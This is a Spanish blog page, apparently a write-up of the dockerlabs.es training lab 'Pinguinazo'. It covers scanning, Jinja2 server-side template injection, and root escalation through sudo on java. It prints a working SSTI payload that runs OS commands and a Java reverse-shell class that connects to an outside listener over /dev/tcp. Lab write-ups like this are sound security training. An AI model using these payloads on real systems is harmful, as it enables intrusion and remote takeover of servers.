@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Jekyll">
+  
+
+  <title>dockerlabs.es: máquina Pinguinazo - Hackers ficticios que hacen historia</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+  <link rel="alternate" type="application/rss+xml" title="Hackers ficticios que hacen historia" href="http://localhost:4000/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="dockerlabs.es: máquina Pinguinazo" />
+<meta name="author" content="Danielprz21" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="danielprz writeups y cosas…" />
+<meta property="og:description" content="danielprz writeups y cosas…" />
+<link rel="canonical" href="http://localhost:4000/blog/2024/dockerlabs-es-maquina-Pinguinazo" />
+<meta property="og:url" content="http://localhost:4000/blog/2024/dockerlabs-es-maquina-Pinguinazo" />
+<meta property="og:site_name" content="Hackers ficticios que hacen historia" />
+<meta property="og:image" content="http://localhost:4000/blog/assets/dockerlabs.es_pinguinazo/portada.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-21T23:10:00+02:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/blog/assets/dockerlabs.es_pinguinazo/portada.png" />
+<meta property="twitter:title" content="dockerlabs.es: máquina Pinguinazo" />
+<meta name="twitter:site" content="@danielprz" />
+<meta name="twitter:creator" content="@Danielprz21" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Danielprz21"},"dateModified":"2024-05-21T23:10:00+02:00","datePublished":"2024-05-21T23:10:00+02:00","description":"danielprz writeups y cosas…","headline":"dockerlabs.es: máquina Pinguinazo","image":"http://localhost:4000/blog/assets/dockerlabs.es_pinguinazo/portada.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2024/dockerlabs-es-maquina-Pinguinazo"},"url":"http://localhost:4000/blog/2024/dockerlabs-es-maquina-Pinguinazo"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+  <body>
+    <div id="wrapper">
+      <header>
+  <div>
+    <a href="/">
+    
+    <h1><!--email_off-->danielprz21@home:~$<!--/email_off--></h1>
+    </a>
+    <div class="header-links">
+      <a href="/about"><h2 class="header-link">Yo</h2></a>
+<a href="/"><h2 class="header-link">Blog</h2></a>
+<a href="/tags/"><h2 class="header-link">Etiquetas</h2></a>
+
+<!--<a href="/feed.xml"><h2 class="header-link">RSS</h2></a>-->
+
+    </div>
+  </div>
+</header>
+
+      <div class="container">
+        <section id="main_content">
+          <article>
+  <h2>dockerlabs.es: máquina Pinguinazo</h2>
+  <div class="postitem">
+    
+      <a href="/blog/" class="no-decoration"><code class="language-plaintext highlighter-rouge">blog</code></a>
+    
+    
+      <code class="posttag"><a href="/tags/#kali-linux" class="no-decoration">Kali Linux</a></code>
+    
+      <code class="posttag"><a href="/tags/#netcat" class="no-decoration">Netcat</a></code>
+    
+      <code class="posttag"><a href="/tags/#privilege-escalation" class="no-decoration">Privilege Escalation</a></code>
+    
+      <code class="posttag"><a href="/tags/#pentesting" class="no-decoration">Pentesting</a></code>
+    
+      <code class="posttag"><a href="/tags/#cybersecurity" class="no-decoration">Cybersecurity</a></code>
+    
+      <code class="posttag"><a href="/tags/#cve" class="no-decoration">CVE</a></code>
+    
+      <code class="posttag"><a href="/tags/#exploits" class="no-decoration">Exploits</a></code>
+    
+      <code class="posttag"><a href="/tags/#linux" class="no-decoration">Linux</a></code>
+    
+      <code class="posttag"><a href="/tags/#reverse-shell" class="no-decoration">Reverse Shell</a></code>
+    
+      <code class="posttag"><a href="/tags/#post-exploitation" class="no-decoration">Post Exploitation</a></code>
+    
+  </div>
+  <time datetime="2024-05-21T23:10:00+02:00" class="by-line">21 May 2024</time>
+  <p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/portada.png" alt="" />
+<br /></p>
+
+<h3 id="descripción">Descripción</h3>
+<hr />
+<p><br />
+En esta guía, se documenta el proceso de explotación de vulnerabilidades en un entorno simulado utilizando Kali Linux. El writeup cubre los pasos desde la identificación de una vulnerabilidad inicial hasta la obtención de acceso root en el sistema de destino.</p>
+
+<h3 id="enlace-de-lab">Enlace de Lab:</h3>
+<p><a href="https://www.dockerlabs.es/">dockerlabs.es: Pinguinazo</a>.</p>
+
+<h3 id="dificultad">Dificultad:</h3>
+<p>Fácil.</p>
+
+<h3 id="solución">Solución</h3>
+<hr />
+<p><br /></p>
+
+<p>Para iniciar el proceso de <code class="language-plaintext highlighter-rouge">vulnerar</code> esta máquina, lo primero que haremos es con ayuda de <code class="language-plaintext highlighter-rouge">nmap</code> ver a qué nos estamos enfrentando.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span>  <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> 172.17.0.2 <span class="nt">-oX</span> report.xml <span class="nt">-v</span>
+</code></pre></div></div>
+<p>donde:</p>
+
+<p><code class="language-plaintext highlighter-rouge">-p-</code>: Escanea todos los puertos existentes (0-65365)</p>
+
+<p><code class="language-plaintext highlighter-rouge">-Pn</code>: Evita que <code class="language-plaintext highlighter-rouge">nmap</code> realice un descubrimiento de host antes de realizar el escaneo</p>
+
+<p><code class="language-plaintext highlighter-rouge">-sS</code>: Realiza un escaneo de puertos TCP mediante un escaneo SYN. Esto implica enviar un paquete SYN y esperar una respuesta; si el puerto está abierto, el host responderá con un paquete SYN-ACK</p>
+
+<p><code class="language-plaintext highlighter-rouge">--min-rate</code>: Configura la tasa mínima de paquetes enviados a 5000 paquetes por segundo. Esto acelera el escaneo, ya que <code class="language-plaintext highlighter-rouge">nmap</code> enviará paquetes a una tasa muy alta</p>
+
+<p><code class="language-plaintext highlighter-rouge">--open</code>: Esta opción le indica a <code class="language-plaintext highlighter-rouge">nmap</code> que sólo muestre los puertos que están abiertos.</p>
+
+<p><code class="language-plaintext highlighter-rouge">-oX</code>: Guarda la salida del escaneo en un archivo XML llamado <code class="language-plaintext highlighter-rouge">report.xml</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">-v</code>: Aumenta la verbosidad de la salida de <code class="language-plaintext highlighter-rouge">nmap</code>, proporcionando más detalles sobre lo que está haciendo <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_1.JPG" alt="" />
+<br /></p>
+
+<p>Obtenemos 1 puerto abierto, <code class="language-plaintext highlighter-rouge">5000 -&gt; upnp?</code>  .</p>
+
+<p>Ahora es momento de ver con qué versiones nos estamos enfrentando de cada servicio. Para ello implementamos el código:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p5000</span> 172.17.0.2-oN ports_version
+</code></pre></div></div>
+
+<p>Donde:</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">-sC</code></strong>: Esta opción le dice a <code class="language-plaintext highlighter-rouge">nmap</code> que ejecute scripts predeterminados contra los puertos encontrados.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">-sV</code></strong>: Le indica a <code class="language-plaintext highlighter-rouge">nmap</code> que intente determinar la versión de los servicios que se están ejecutando en los puertos abiertos.</p>
+
+<blockquote>
+  <p><em>sCV es la combinación de ambos comandos</em>.</p>
+</blockquote>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_2.JPG" alt="" />
+<br /></p>
+
+<p>Nos fijamos que tiene un puerto abierto.</p>
+
+<p><code class="language-plaintext highlighter-rouge">puerto 5000</code>: servicio upnp?</p>
+
+<p>Lo primero que haremos es ver los vectores de entrada que tiene el <code class="language-plaintext highlighter-rouge">puerto 5000</code>, vemos que es una template hecha con <code class="language-plaintext highlighter-rouge">Jinja</code></p>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_form.png" alt="" />
+<br /></p>
+
+<p>Vemos que es una web con un formulario básico que pide cierta información. Veremos si es vulnerable a <code class="language-plaintext highlighter-rouge">html injection</code></p>
+
+<p>escribimos en <code class="language-plaintext highlighter-rouge">PinguNombre</code> el siguiente comando:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Canary<span class="nt">&lt;/h1&gt;</span>
+</code></pre></div></div>
+<p>Y vemos que es vulnerable</p>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_4.JPG" alt="" />
+<br /></p>
+
+<p>Intentamos hacer un <code class="language-plaintext highlighter-rouge">SSTI (Server Side Template Injection)</code></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ { 7*7 } } (sin los espacios)
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_5.JPG" alt="" />
+<br /></p>
+
+<p>Y vemos que es vulnerable a este ataque.</p>
+
+<p>Ahora es momento de correr comandos de linux, navegando en internet podemos encontrar varias web que nos ofrecen payloads y comandos ya listos.</p>
+
+<p>En esta página web <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> encontramos varios <code class="language-plaintext highlighter-rouge">payloads</code>.</p>
+
+<p>Ejecutar uno para determinar qué usuario somos</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span> <span class="n">request</span><span class="p">.</span><span class="n">application</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_6.JPG" alt="" />
+<br /></p>
+
+<p>Ejecutando el comando <code class="language-plaintext highlighter-rouge">id</code> vemos que pertenecemos al grupo <code class="language-plaintext highlighter-rouge">pinguinazo</code></p>
+
+<p>Ya que podemos correr comandos a nivel de sistema, es momento de hacer una <code class="language-plaintext highlighter-rouge">reverse shell</code> para tener acceso al servidor</p>
+
+<p>Abrimos un puerto en <code class="language-plaintext highlighter-rouge">nc</code> en modo de escucha con el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 443
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_7.JPG" alt="" />
+<br /></p>
+
+<p>Presionamos el botón <code class="language-plaintext highlighter-rouge">save all</code> y volvemos a nuestra <code class="language-plaintext highlighter-rouge">nc</code> en modo escucha, obtendremos lo siguiente:</p>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_8.JPG" alt="" />
+<br /></p>
+
+<p>Vemos que somos el usuario <code class="language-plaintext highlighter-rouge">Pinguinazo</code>, es momento de tratar la bash, más que nada para poder hacer <code class="language-plaintext highlighter-rouge">ctrl+c</code> sin matar la <code class="language-plaintext highlighter-rouge">reverse shell</code> y <code class="language-plaintext highlighter-rouge">ctrl+l</code> para poder limpiar la pantalla:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">ctrl+z</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
+</span>reset xterm
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+</code></pre></div></div>
+
+<p>Si hacemos nano, vi o cat, la pantalla nos aparecerá pequeña y no podremos crear archivos con total libertad. Para ello, corremos lo siguiente:</p>
+
+<p>Abrimos una terminal nueva y corremos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>size
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/dockerlab.es_upload/bash.png" alt="" />
+<br />
+Nos aparecerán dos números, el primero corresponde a las <code class="language-plaintext highlighter-rouge">rows</code> y el segundo a <code class="language-plaintext highlighter-rouge">columns</code>.</p>
+
+<p>Abrimos la <code class="language-plaintext highlighter-rouge">reverse shell</code> y corremos el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>rows 24 columns 128
+</code></pre></div></div>
+
+<p>Una vez ya tratamos la <code class="language-plaintext highlighter-rouge">tty</code> es momento de buscar una vía para <code class="language-plaintext highlighter-rouge">escalar privilegios</code>. Para eso, ejecutamos el comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_9.JPG" alt="" />
+<br /></p>
+
+<p>Vemos que podemos ejecutar como usuario <code class="language-plaintext highlighter-rouge">root</code> sin necesidad de password el binario de <code class="language-plaintext highlighter-rouge">java</code></p>
+
+<p>No hay ninguna forma de escalar con permisos, como el caso de <code class="language-plaintext highlighter-rouge">python</code>, <code class="language-plaintext highlighter-rouge">ruby</code> o <code class="language-plaintext highlighter-rouge">php</code>.</p>
+
+<p>Así que haremos una reverse shell y abrimos otra terminal con <code class="language-plaintext highlighter-rouge">nc</code> en nuestra máquina local.</p>
+
+<p>Si vamos al a web de <code class="language-plaintext highlighter-rouge">revshell</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> y en la sección de <code class="language-plaintext highlighter-rouge">java</code> copiamos la siguiente:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">shell</span> <span class="o">{</span>
+   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+       <span class="nc">Process</span> <span class="n">p</span><span class="o">;</span>
+       <span class="k">try</span> <span class="o">{</span>
+           <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/172.17.0.1/443 0&gt;&amp;1"</span><span class="o">);</span>
+           <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+           <span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span>
+       <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
+   <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Con nuestra nueva <code class="language-plaintext highlighter-rouge">nc</code> en modo escucha</p>
+
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_7.JPG" alt="" />
+<br /></p>
+
+<p>Corremos el script de la siguiente forma:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/java reverse_shell.java
+</code></pre></div></div>
+<p><br />
+<img src="/blog/assets/dockerlabs.es_pinguinazo/paso_10.JPG" alt="" />
+<br /></p>
+
+<p>Y vemos que recibimos la conexión como usuario <code class="language-plaintext highlighter-rouge">root</code> en nuestra máquina.</p>
+<h3 id="referencias"><em>Referencias</em></h3>
+<hr />
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p><a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/">Jinja2: Template injection</a> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p><a href="https://www.revshells.com/">Reverse Shell Generator</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+</article>
+
+        </section>
+      </div>
+    </div>
+
+     
+  
+    <footer class="site-footer">
+  <div class="row">
+    <div class="footer-wrapper">
+      <div class="footer-col-social col-5 col-s-4">
+        <ul>
+  
+    <li class="social-media-list">
+      <a title="Email Address" href="mailto:rubel.daniel.perez@gmail.com"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12.713l-11.985-9.713h23.971l-11.986 9.713zm-5.425-1.822l-6.575-5.329v12.501l6.575-7.172zm10.85 0l6.575 7.172v-12.501l-6.575 5.329zm-1.557 1.261l-3.868 3.135-3.868-3.135-8.11 8.848h23.956l-8.11-8.848z"/></svg>
+</span><span>rubel.daniel.perez@gmail.com</span></a>
+    </li>
+  
+
+  
+    <li class="social-media-list">
+      <a title="GitHub Profile" href="https://github.com/rubelperez"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+</span><span>rubelperez</span></a>
+    </li>
+  
+
+  
+    <li class="social-media-list">
+      <a title="X Profile" href="https://x.com/danielprz217"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="24px" height="24px" clip-rule="evenodd" baseProfile="basic"><polygon fill="#616161" points="41,6 9.929,42 6.215,42 37.287,6"/><polygon fill="#fff" fill-rule="evenodd" points="31.143,41 7.82,7 16.777,7 40.1,41" clip-rule="evenodd"/><path fill="#616161" d="M15.724,9l20.578,30h-4.106L11.618,9H15.724 M17.304,6H5.922l24.694,36h11.382L17.304,6L17.304,6z"/></svg>
+</span><span>danielprz217</span></a>
+    </li>
+  
+
+  
+
+  
+    <li class="social-media-list">
+      <a title="LinkedIn Profile" href="https://linkedin.com/in/rubeldanielperez"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+</span><span>rubeldanielperez</span></a>
+    </li>
+  
+
+
+  <!---->
+
+  
+
+  <li class="social-media-list">
+    <a title="RSS Feed" href="/feed.xml"><span class="icon-nofill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#ee802f" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"/></svg>
+</span><span>rss</span></a>
+  </li>
+</ul>
+
+      </div>
+      <div class="footer-col-badges col-3 col-s-5">
+        <ul>
+  
+    <li class="social-media-list">
+      <a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/730318"><img src="https://www.hackthebox.eu/badge/image/730318" alt="Hack The Box"></a>
+    </li>
+  
+
+  
+    <li class="social-media-list">
+      <a title="TryHackMe Profile" href="https://tryhackme.com/p/danielprz217"><img src="https://tryhackme-badges.s3.amazonaws.com/danielprz217.png" alt="TryHackMe"></a>
+    </li>
+  
+</ul>
+
+
+      </div>
+      <div class="footer-col-copyright col-10 col-s-10">
+        <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+          <span>
+              <b>danielprz21</b>
+          </span>
+          
+          <span>© 2024</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    
+  </body>
+</html>
